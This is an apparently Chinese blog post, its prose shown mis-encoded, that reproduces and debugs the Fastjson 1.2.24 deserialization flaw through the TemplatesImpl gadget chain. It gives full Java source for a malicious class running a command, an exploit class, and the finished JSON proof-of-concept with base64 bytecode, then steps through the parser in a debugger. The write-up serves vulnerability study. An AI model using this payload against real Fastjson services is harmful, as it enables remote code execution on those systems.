<h2 id="ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸€ï¼‰â€”â€”1-2-22-1-2-24"><a href="#ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸€ï¼‰â€”â€”1-2-22-1-2-24" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸€ï¼‰â€”â€”1.2.22-1.2.24"></a>ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸€ï¼‰â€”â€”1.2.22-1.2.24</h2><h3 id="åŸºäºTemplatesImplçš„åˆ©ç”¨é“¾"><a href="#åŸºäºTemplatesImplçš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäºTemplatesImplçš„åˆ©ç”¨é“¾"></a>åŸºäº<code>TemplatesImpl</code>çš„åˆ©ç”¨é“¾</h3><h4 id="é™åˆ¶æ¡ä»¶"><a href="#é™åˆ¶æ¡ä»¶" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h4><p>éœ€è¦è®¾ç½®<code>Feature.SupportNonPublicField</code>è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ‰èƒ½æˆåŠŸè§¦å‘åˆ©ç”¨ã€‚</p>
<h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>ç¬”è€…å¤ç°ç”¨åˆ°çš„jaråŒ…ï¼šfastjson-1.2.24.jarï¼Œcommons-codec-1.12.jarï¼Œcommons-io-2.5.jar</p>
<p>åœ¨åˆšæ‰çš„é¡¹ç›®ä¸­ï¼Œæ–°å»ºä¸€ä¸ªå«æœ‰å±é™©æ“ä½œï¼ˆå¼¹è®¡ç®—å™¨ï¼‰çš„ç±»<code>EvilClass.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">EvilClass</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ–°å»ºä¸€ä¸ªåˆ©ç”¨ä»£ç <code>TemplatesImpl_Exp.java</code>ï¼Œä½œä¸ºæ¼æ´å…¥å£ï¼Œå…¶ä¸­27è¡Œ<code>readClass()</code>æ–¹æ³•ç”¨äºè¯»å–<code>EvilClass.class</code>æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œbase64ç¼–ç ã€‚ç”±äºååºåˆ—åŒ–ä¸­<code>_bytecodes</code>ã€<code>_tfactory</code>ç­‰éƒ½æ˜¯ç§æœ‰å±æ€§ï¼Œå› æ­¤<code>parseObject()</code>éœ€è¦å‚æ•°<code>Feature.SupportNonPublicField</code>ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImpl_Exp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> evilClassPath <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"file.separator"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"target/classes/TemplatesImpl_Exploit/EvilClass.class"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token function">readClass</span><span class="token punctuation">(</span>evilClassPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> NASTY_CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> text1 <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> NASTY_CLASS <span class="token operator">+</span>
                    <span class="token string">"\",\"_bytecodes\":[\""</span><span class="token operator">+</span>evilCode<span class="token operator">+</span><span class="token string">"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },"</span> <span class="token operator">+</span>
                    <span class="token string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n"</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span class="token punctuation">;</span>

            JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¾“å‡ºçš„POCï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADMAMgoABwAkCgAlACYIACcKACUAKAcAKQoABQAkBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzczsBAApFeGNlcHRpb25zBwArAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcALQwALgAvAQAEY2FsYwwAMAAxAQAfVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABUADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABgACAAZAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABABAAAQAiAAAAAgAj"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>'_name'<span class="token operator">:</span>'a.b'<span class="token punctuation">,</span>'_tfactory'<span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token property">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token property">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å…³é”®ç‚¹è§£é‡Šï¼š</p>
<ul>
<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>æ˜¯é‚£ä¸ªå¸¦æœ‰å±é™©æ“ä½œçš„ç±»ï¼›</li>
<li>ç»è¿‡base64ç¼–ç çš„payloadä¼šç»è¿‡ç§æœ‰å±æ€§<code>_bytecodes</code>ä¼ é€’ç»™<code>_outputProperties</code>å‡½æ•°ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼›</li>
<li>å¦å¤–ï¼Œåœ¨<code>defineTransletClasses()</code>æ—¶ä¼šè°ƒç”¨<code>getExternalExtensionsMap()</code>ï¼Œå½“ä¸ºnullæ—¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¦å¯¹<code>_tfactory</code>è®¾ç½®ï¼Œè¿™ä¸€ç‚¹åé¢è°ƒè¯•åˆ†æä¼šè¯´åˆ°ã€‚</li>
</ul>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175654367.png"></p>
<h4 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h4><p>ä»¥ç»ˆä¸ºå§‹ï¼Œæ–­ç‚¹ä¸‹åœ¨<code>EvilClass.java</code>çš„å±é™©æ“ä½œä»£ç è¡Œ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175826238.png" style="zoom:80%;">

<p>å®Œæ•´è°ƒç”¨é“¾å¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175954700.png" style="zoom:90%;">

<p>ä¸ºäº†è°ƒè¯•åˆ†æï¼Œåœ¨å…¥å£<code>JSON.parseObject()</code>ä¸‹ä¸ªæ–­ç‚¹ï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180157152.png"></p>
<p>ç„¶ååˆ°<code>DefaultJSONParser</code>å¯¹è±¡çš„<code>parseObject()</code>æ–¹æ³•ï¼Œç»§ç»­è¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180415783.png"></p>
<p>æ¥ç€è°ƒç”¨äº†<code>ObjectDeserializer</code>çš„<code>deserialze()</code>æ–¹æ³•ï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180611353.png"></p>
<p>ç„¶ååˆ¤æ–­è°ƒç”¨<code>DefaultJSONParser</code>çš„<code>parseObject()</code>æ–¹æ³•è¿˜æ˜¯<code>parse()</code>æ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨<code>DefaultJSONParser.parse()</code>æ–¹æ³•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180822913.png"></p>
<p>åœ¨<code>DefaultJSONParser.parse()</code>é‡Œå¯¹JSONå†…å®¹è¿›è¡Œæ‰«æï¼Œåœ¨switchè¯­å¥ä¸­åŒ¹é…ä¸Šäº†<code>{</code>å³å¯¹åº”12ï¼Œè°ƒç”¨<code>DefaultJSONParser.parseObject()</code>è¿›è¡Œè§£æï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181152169.png"></p>
<p>æ¥ç€å°±æ˜¯åœ¨<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>é‡Œå¾ªç¯è§£æjsonä¸­çš„å†…å®¹ï¼Œå…¶ä¸­<code>skipWhitespace()</code>å‡½æ•°ç”¨äºå»é™¤æ•°æ®ä¸­çš„ç©ºæ ¼å­—ç¬¦ï¼Œç„¶åè·å–å½“å‰å­—ç¬¦æ˜¯å¦ä¸ºåŒå¼•å·ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨<code>scanSymbol()</code>è·å–åŒå¼•å·å†…çš„å†…å®¹ï¼Œè¿™é‡Œå¾—åˆ°ç¬¬ä¸€ä¸ªåŒå¼•å·é‡Œçš„å†…å®¹ä¸º<code>@type</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181334866.png"></p>
<p>å¾€ä¸‹è°ƒè¯•ï¼Œåˆ¤æ–­keyæ˜¯å¦ä¸º<code>@type</code>ä¸”æ˜¯å¦å…³é—­äº†<code>Feature.DisableSpecialKeyDetect</code>è®¾ç½®ï¼Œé€šè¿‡åˆ¤æ–­åè°ƒç”¨<code>scanSymbol()</code>è·å–åˆ°äº†<code>@type</code>å¯¹åº”çš„æŒ‡å®šç±»com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplå¹¶è°ƒç”¨<code>TypeUtils.loadClass()</code>å‡½æ•°åŠ è½½è¯¥ç±»ï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181515630.png"></p>
<p>çœ‹åˆ°çº¢æ¡†çš„ä¸¤ä¸ªåˆ¤æ–­è¯­å¥ä»£ç é€»è¾‘ï¼Œæ˜¯åˆ¤æ–­å½“å‰ç±»åæ˜¯å¦<strong>ä»¥<code>[</code>å¼€å¤´</strong>æˆ–<strong>ä»¥<code>L</code>å¼€å¤´ä»¥<code>;</code>ç»“å°¾</strong>ï¼Œå½“ç„¶æœ¬æ¬¡è°ƒè¯•åˆ†ææ˜¯ä¸ä¼šè¿›å…¥åˆ°è¿™ä¸¤ä¸ªé€»è¾‘ï¼Œä½†æ˜¯<strong>è¿™ä¸¤ä¸ªåˆ¤æ–­é€»è¾‘ä¸ºåé¢çš„è¡¥ä¸ç»•è¿‡æä¾›äº†æ€è·¯</strong>ï¼Œå€¼å¾—æ³¨æ„ã€‚</p>
<p>æ¥ç€é€šè¿‡<code>classLoader.loadClass()</code>åŠ è½½åˆ°ç›®æ ‡ç±»åï¼Œå°†è¯¥ç±»åå’Œç±»ç¼“å­˜åˆ°Mapä¸­ï¼Œæœ€åè¿”å›è¯¥åŠ è½½çš„ç±»ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181741056.png"></p>
<p>è¿”å›åç»§ç»­æ¥ç€<code>TypeUtils.loadClass()</code>å¾€ä¸‹æ‰§è¡Œï¼Œç„¶åè°ƒç”¨<code>deserializer.deserialze()</code>å¯¹<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181901649.png"></p>
<p>æ‰§è¡Œæ¥åˆ°forå¾ªç¯ï¼Œå¾ªç¯æ‰«æè§£æ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182150090.png"></p>
<p><code>fieldIndex</code>å€¼ä¸º3æ—¶ï¼Œä¼šè°ƒç”¨<code>parseField()</code>ç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶è§£æåˆ° key å€¼ä¸º<code>_bytecodes</code>ï¼Œè¿›å…¥<code>parseField()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182437049.png"></p>
<p>ä¼šè°ƒç”¨<code>fieldDeserializer.parseField()</code>å¯¹<code>_bytecodes</code>çš„å€¼è¿›ä¸€æ­¥è§£æï¼Œè¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182639502.png"></p>
<p>æ¥ç€ï¼Œä¼šè§£æå‡º<code>_bytecodes</code>å¯¹åº”çš„å†…å®¹ï¼Œç„¶åè°ƒç”¨<code>setValue()</code>å‡½æ•°è®¾ç½®å¯¹åº”çš„å€¼ï¼Œè¿™é‡Œvalueå³ä¸ºæ¶æ„ç±»äºŒè¿›åˆ¶å†…å®¹Base64è§£ç åçš„æ•°æ®ï¼Œè§£ç è¿‡ç¨‹å‘ç”Ÿåœ¨<code>setValue()</code>å‰é¢çš„<code>fieldValueDeserilizer.deserialze()</code>å‡½æ•°ã€‚å› ä¸ºæœ‰è§£ç ï¼Œæ‰€ä»¥åœ¨æ„é€ POCçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿè¿›è¡Œäº†Base64ç¼–ç ã€‚è¿›å…¥<code>setValue()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182850116.png"></p>
<p>è¿›å…¥åå¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨äº†<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>çš„<code>set()</code>æ–¹æ³•æ¥è®¾ç½®<code>_bytecodes</code>çš„å€¼ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182952042.png"></p>
<p>ç„¶åå›åˆ°forå¾ªç¯éå†JSONæ•°æ®ä¸­çš„å…¶å®ƒé”®å€¼å¯¹å¹¶èµ‹å€¼ï¼Œä¸‹é¢æ˜¯<code>_name</code>èµ‹å€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183154373.png"></p>
<p>ç»™<code>_tfactory</code>èµ‹å€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183306826.png"></p>
<p>ç„¶åæ¥åˆ°äº†æˆ‘ä»¬çš„å…³é”®å‡½æ•°<code>outputProperties</code>ï¼Œè¿›å…¥<code>setValue()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183410580.png"></p>
<p>ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œä¼šé€šè¿‡åå°„æœºåˆ¶è°ƒç”¨<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>æ–¹æ³•ï¼Œä¸‹åˆ’çº¿è·‘å»å“ªäº†ï¼Ÿåœ¨ç»è¿‡<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>å‡½æ•°æ—¶ï¼Œä¼šæŠŠä¸‹åˆ’çº¿å»æ‰ã€‚</p>
<p><code>getOutputProperties()</code>æ–¹æ³•ç±»å‹æ˜¯<code>Properties</code>ï¼Œæ»¡è¶³ä¹‹å‰æˆ‘ä»¬å¾—åˆ°çš„ç»“è®ºå³Fastjsonååºåˆ—åŒ–ä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„ç±»çš„æŸäº›æ»¡è¶³æ¡ä»¶çš„<code>getter</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œéœ€è¦é€‰æ‹©å¼ºåˆ¶è¿›å…¥</p>
